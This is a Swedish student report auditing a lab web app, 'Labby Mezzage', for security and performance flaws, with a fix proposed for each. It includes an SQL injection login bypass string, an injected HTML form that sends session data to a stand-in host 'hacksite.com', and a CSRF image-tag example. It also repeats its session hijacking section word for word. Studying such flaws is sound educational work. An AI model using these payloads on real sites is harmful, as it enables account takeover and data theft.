Hampus Jarleborn - HJ222HI

# Rapport

## Säkerhetsproblem


## Session Hijacking

##### Beskrivning

Session Hijacking är när en "hacker"-användare stjäler en annan användares session, detta kan tillexempel görs genom att man lurar dom att klicka på en länk som i det dolda skickar vidare information om deras session och eller cookie till "hacker"-användaren. Denne kan sedan mata in session/cookie IDet i sin egen sesson och på så sätt ta över den andra användarens inlogging. [3]

##### Förebyggande åtgärder

Först och främst så kan måste man precis som med XSS validera allt väldigt noga. Det är också viktigt att man förstör sessionen när användaren loggar ut för då så loggas även "hacker"-användaren ut.

#### I Labby Mezzage
I Labby Mezzage kan man med hjälp av XSS stjäla användarens sessions föratt sedan användadet för att logga in.

##### Förslag på lösning

Som jag skrev ovan om XSS så behövd det valideras mera. Sen så behöver man förstöra sessionen när användaren loggas ut så att även "hacker"-användaren loggas ut.


## SQL Injections

##### Beskrivning

SQL injections är när användaren skickar in egna SQL satser för att komma åt eller förstöra information på sida. Det krävs dock att sidan använder en databas, för annars finns det inget att skicka förfrågningar till.[1]

##### Följder

Som det står i texten över så kan en användare om SQL injections är möjliga komma åt saker som lösenord och annan känslig data, och använda dessa på de sett dom finner bäst. Och det är sällan eller aldrig bra.


#### I Labby Mezzage

I Labby Mezzage finns det möjligheter för att göra SQL injections, tillexempel kan man logga in som senaste inloggade användaren genom att skriva in vilken mail adress som helst som email och sedan skriva 1'or'1'='1 som då gör att det alltid blir true.

##### Förslag på lösning

Lösningen skulle jag säga är att istället för att skriva SQL sataserna som dom är gjorde i Labby Mezzage så bör man parametrisera dom istället för att konkatenera dom.
Man kan också skydda sig mot detta genom att använda storedprocedures och på så viss inte vissa SQL satsen.[1]




## XSS (Cross site scripting)

##### Beskrivning

Cross site scripting eller XSS är när en använadere lyckas stoppa in kod som hen själv har skrivit i din sida. Detta sker allt som oftast genom inputs. Och så kan hen föra in kod som kan ändrar vad sidan kan göra eller hur den ser ut.


#####Följder

XXS kan vara farligt då det gör så "hacker"-användaren kan stjäla information i form av känslig data om antingen andra användaren eller själva utvecklaren. "hacker"användaren kan också ändra vad sidan gör så att den blir obrukbar och på så sätt inte används och då tjänar ju inte utvecklaren några pengar.[2]

##### Förebyggande åtgärder

Det viktiga är att man validerar man ska alltid se till så att man säkrar att det som kommer in till sidan är det man vill att det ska vara och inget annat. Framförallt ska man se till så att man inte kan stoppa in taggar, varken script eller HTML. Man kan också göra en så kallad white-list validation där man kräver vissa tecken och eller längder på det användaren matar in.

#### I Labby Mezzage

I Labby Mezzage kan man inte mata in script taggar, men däremot så kan man mata in HTML och CSS. Detta gör att man kan påverka sidans utseende. Detta kanske låter harmlöst men man kan till exempel dölja fältet där man matar in meddelandet och sedan göra ett eget, som inte bara skickar ett meddelande till sidans server utan som också skickar vidare användarens sessionID och uppgifter. Det ända man hade behövt göra är att skriva detta i meddelande rutan

    <form action="hacksite.com/HackTheTHing.php">
      E-post:

     <input type="text" name="epost" value="exampel@ex.com">
     <br>
     Message:
    <input type="text" name="message" value="">
     <br><br>
     <input type="submit" value="Submit">
    </form>


##### Förslag på lösning

Som jag skrev ovan så borde man valdiera bättre och på så viss inte låta taggar hamna på sidan. 

## CSRF (Cross Site Request Forgery)

##### Beskrivning

CSRF är när en "hacker" får användaren att göra något dom inte planerat att göra. Detta görs oftast via länkar och bilder. Här nedan följer ett exempel där en "hacker" får användaren att rösta på "hackern" på www.VoteforTheBestHacker.com  

    <img src="http://www.voteforthebesthacker.com/vote/Hacker" />
    
Om någon nu klickar på länken så kommer den användaren utan att veta om det rösta på hackern.  [12][13]

#####Följder

Följderna av CSRF är att använadren kan luras att göra saker som hen inte tänkt göra utan att veta om det. Och man kan som utvecklare tillåter användare att länka till bilder via taggar så kan man utan att veta om det ha en sidan som gör massa saker som inte är menningen. 

##### Förebyggande åtgärder

Är att man använader ett så kallat token pattern. Om vi tar exemplet vi anvaände innan. Nämligen att man röstar genom att posta http://www.voteforthebesthacker.com/vote/Hacker. Om man hade använt ett token pattern så hade länke sett ut mer som http://www.voteforthebesthacker.com/vote/Hacker?token=4234uy2i34y23i4uyi2. Token på slutet behövs för att kunna rösta och sluta gälla efter en viss tid eller efter att den används. Detta skyddar mot att "hackers" får andra användare att använda din sidas funktionalitet. [12][13]


#### I Labby Mezzage
Jag får inte igång sidan. Jag och John kollade på det innan jul och vi fick inte rätt på det. Men jag skulle kunna gissa att postningen av meddelanden går att göra utan token och vi vet ju redan att man kan lägga in bild taggar. 

##### Förslag på lösning

Använda token pattern.

## Session Hijacking

##### Beskrivning

Session Hijacking är när en "hacker"-användare stjäler en annan användares session, detta kan tillexempel görs genom att man lurar dom att klicka på en länk som i det dolda skickar vidare information om deras session och eller cookie till "hacker"-användaren. Denne kan sedan mata in session/cookie IDet i sin egen sesson och på så sätt ta över den andra användarens inlogging. [3]

##### Förebyggande åtgärder

Först och främst så kan måste man precis som med XSS validera allt väldigt noga. Det är också viktigt att man förstör sessionen när användaren loggar ut för då så loggas även "hacker"-användaren ut.

#### I Labby Mezzage
I Labby Mezzage kan man med hjälp av XSS stjäla användarens sessions föratt sedan användadet för att logga in.

##### Förslag på lösning

Som jag skrev ovan om XSS så behövd det valideras mera. Sen så behöver man förstöra sessionen när användaren loggas ut så att även "hacker"-användaren loggas ut.


## Brist på salt

##### Beskrivning

Brist på salt kan göra maten smaklös. Nä men skämt och sido, om man inte haschar eller krypterar lösenord så sparas dom i klartext i databasen vilket gör att alla som har tillgång till den ser dom, både utvecklare och eventuella hackers. [4]


##### Förebyggande åtgärder

Att alltid se till att hasha alla lösenord så att dom inte sparas i klartext i databasen. Varför man ska hasha istället för att kryptera är på grund av att när man krypterar så kan man med hjälp av krypterings nycklen dekryptera tillbaka lösenordet till klartext. Medans hash gör om det klartext till ett hash och sedan när man loggar in så görs det lösenord som användaren skriver in också till ett hash som jämförs med det i databasen. Kryptering använder man om man behöver få tillgång till orginal texten, tillexempel hemliga e-post.

#### I Labby Mezzage

Vid inloggingn så hashas inte lösenordet. Detta ser man om man kollar i /lib/login.js där man inte på något sätt gör om det användaren skriver in till ett hash. 

##### Förslag på lösning

Är att tillexempel använda ett salt som man defingerar och sedan kör lösenordet igenom. [4]


## Prestandaproblem


## Inline scripts och inline css

##### Beskrivning

Inline script och inline css bettyder att man i sin HTML markup bakar in script och style kod. EX:
    
    <h1 style="color:blue;margin-left:30px;">This is a heading.</h1>

[5]

Detta ska man undvika. För om man gör som ovanstående exemple så kan man inte cacha resurserna och då måste dom läsas in varjegång sidan updateras. Man vill också låta bli inline på grund av att om man användet inline så kommer renderingen av DOMelementetn stanna upp varje gång den hittar script och style kod och renderar den först. Detta gör att vissa element på sidan inte kommer gå att se förän efter sript och liknanade är klara. En till anledning att inte använda inline är att det gör det väldigt jobbigt för utveckalre att gå in och ändra i koden. [6]

##### Förebyggande åtgärder

För att undvika inline så ska man använda det som heter external scripts och external stylesheets. Det innebär att man lägger script och style kod i serperata filer som man sedan laddar in.[6] Style filer(CSS) ska laddas in toppen för att slippa att sidan blir helt vit när den laddas in och inte liksom hoppar fram suksesivt.[8] script i botten. Detta för att sidan ska se rätt ut och för att scripten kan ta längst tid och därför bör laddas in sist så att dom inte blockerar något annat från att laddas. Det kan också bli så att det uppstår errors i javascripten på grunda va att den försker använda HTML element som inte finns för att dom inte är renderade än. [7]

#### I Labby Mezzage

Används inline styles och inline scripts

##### Förslag på lösning

Som jag skrev under Förebyggande åtgärder så bör man bryta ut det till separata filer 

## Onödiga HTTP request

##### Beskrivning

Om man på alla sidor länkar in alla script som appliaktionen använder, kan det lätt bli så att sidan laddar in script som inte behövs. Detta gör att sidan skickar httprequests i onödan. Detta leder till sämte prestanda. [7]


##### Förebyggande åtgärder

Ladda bara in script och liknanade som används på den sidan. 

#### I Labby Mezzage

Appliaktionen läser på alla sidor in två filer som heter MessageBoard.js och Message.js dessa används dock inte på alla sidor och etta gör att sidan skickar HTTP request ionödan vilket gör att sidan blir långsammare.

##### Förslag på lösning

Att inte ladda in MessageBoard.js och Message.js på alla sidor. 

## Komprimering av resurser / Gzip

##### Beskrivning

Man kan komprimera resurser så som Styleheets och Script filer. När man gör det så slås filerna ihop till en fil med en lång rad. Med andra ord så tas allt onödigt bort och det som blir kvar är bara det som behvös för att sidan sak vissas och fungera. 

Det man dock ska komma ihåg är att man inte behöver komprimera bilder, då dessa redan är komprimerade. [10]

##### Effekt

Komprimering gör att filerna går att läsa in snabbare, vilket i sin tur gör att hela sidan blir snabbare. För att browser till exemple slipper gå igenom hundra rader långa kommentarer. [10]
 

#### I Labby Mezzage

Är detta inte gjort vilket gör att sidan är långsammare än nödvändigt

##### Förslag på lösning

Ett alternativ är att man använder ett verktyg som tillexemple http://jscompress.com/  för att komprimera filerna.  

## Cache-header

##### Beskrivning

Cache-headers använder man för att spara resurser så att klienten inte behöver requesta dom varje gång som laddar om sidan. När man sätter sin cache så sätter man en future expires header, detta berättar hur länge resursen kan sparas. Hur lång tid resursen ska sparas är upp till utvecklaren, men det är vanligt att man sätter 30 dagar.  Om utvecklaren vill ändra en cahad resurs så kan det ju vara stuligt om användarna har den cahcad i till exempel 30 dagar. För då kommer inte ändringen ses förän cachens "bäst före datum" gått ut. Men detta kan användaren komma runt genom att bytt namn på den ändrade filen. [11]

##### Effekt

Om man cachar sina resureser så är dom sparade hos klienten vilket gör att klientetn slipper fråga servern om dom. Detta gör att färre HTTP requests görs, och på så sätt blir sidan snabbare. 
 
#### I Labby Mezzage

Är detta inte gjort vilket gör att sidan är långsammare än nödvändigt

##### Förslag på lösning

Använda cache-headers för att skapa färre HTTP requests.   




## Mina Egna övergripande reflektioner

Denna uppgiften har varit väldigt rolig, det är ju lite av en pojkdröm att kunna hacka. Det har också varit väldigt givande att prova då det skapat en större förståelse för hur lätt det är att bryta igenom dålig kod. En sak som gör mig lite nervös var att jag tycket det var svårt att hitta prestanda problem. Och det känns som att jag bara har pekat ut dom självklar och jag misstänker att det finns fler. Men jag har läst på vilekt gjorde att jag hittade lite till och jag tror att jag kommer bli en bättre kdoare om jag fortsätter läsa på.

### Källor

[1] OWASP foundation, "Top 10 2013-A1-Injection", 23 Juni 2013 [Online] Tillgänglig: https://www.owasp.org/index.php/Top_10_2013-A1-Injection [Hämtad: 1 december, 2015].

[2] OWASP foundation, "Top 10 2013-A3-Cross-Site Scripting", 23 Juni 2013 [Online] Tillgänglig: https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS) [Hämtad: 1 december, 2015].

[3] OWASP foundation, "Top 10 2013-A2-Broken Authentication and Session Management", 23 Juni 2013 [Online] Tillgänglig: https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management [Hämtad: 3 december, 2015].

[4] wikibooks, "Lösenordshantering - MD5 och salt", 19 februari 2010 [Online] Tillgänglig: https://sv.wikibooks.org/wiki/L%C3%B6senordshantering_-_MD5_och_salt [Hämtad: 4 december, 2015].

[5]  w3schools, "CSS How To...", [Online] Tillgänglig: http://www.w3schools.com/css/css_howto.asp [Hämtad: 3 januari, 2016].

[6] tevie Souders,Kapitel 2 "Rule 8: Make JavaScript and CSS External8," i High Performance Web Sites: Essential Knowledge for Front-End Engineers,	O'Reilly Media , 2007, [E-bok] Tillgänglig: https://www.ebooks-it.net/ebook/high-performance-web-sites [Hämtad: 1 januari, 2016]

[7] tevie Souders,Kapitel 2 "Rule 5: Put Stylesheets at the Top" i High Performance Web Sites: Essential Knowledge for Front-End Engineers,	O'Reilly Media , 2007, [E-bok] Tillgänglig: https://www.ebooks-it.net/ebook/high-performance-web-sites [Hämtad: 1  januari, 2016]

[8] tevie Souders,Kapitel 2 "Rule 6: Put Scripts at the Bottom" i High Performance Web Sites: Essential Knowledge for Front-End Engineers,	O'Reilly Media , 2007, [E-bok] Tillgänglig: https://www.ebooks-it.net/ebook/high-performance-web-sites [Hämtad: 2  januari, 2016]

[9] tevie Souders,Kapitel 2 "Rule 1: Make Fewer HTTP Requests" i High Performance Web Sites: Essential Knowledge for Front-End Engineers,	O'Reilly Media , 2007, [E-bok] Tillgänglig: https://www.ebooks-it.net/ebook/high-performance-web-sites [Hämtad: 2  januari, 2016]

[10] tevie Souders,Kapitel 2 "Rule 4: Gzip Components" i High Performance Web Sites: Essential Knowledge for Front-End Engineers,	O'Reilly Media , 2007, [E-bok] Tillgänglig: https://www.ebooks-it.net/ebook/high-performance-web-sites [Hämtad: 3  januari, 2016]

[11] tevie Souders,Kapitel 2 "Rule 3: Add an Expires Header" i High Performance Web Sites: Essential Knowledge for Front-End Engineers,	O'Reilly Media , 2007, [E-bok] Tillgänglig: https://www.ebooks-it.net/ebook/high-performance-web-sites [Hämtad: 3  januari, 2016]

[12] OWASP foundation, "Top 10 2013-A3-Cross-Site Scripting", 23 Juni 2013 [Online] Tillgänglig: https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF) [ 3 januari, 2016].

[13]  stackoverflow, "CSRF (Cross-site request forgery) attack example and prevention in PHP.", 26 mars 2010 [Online] Tillgänglig: http://stackoverflow.com/questions/2526522/csrf-cross-site-request-forgery-attack-example-and-prevention-in-php [Hämtad: 3 januari, 2016].
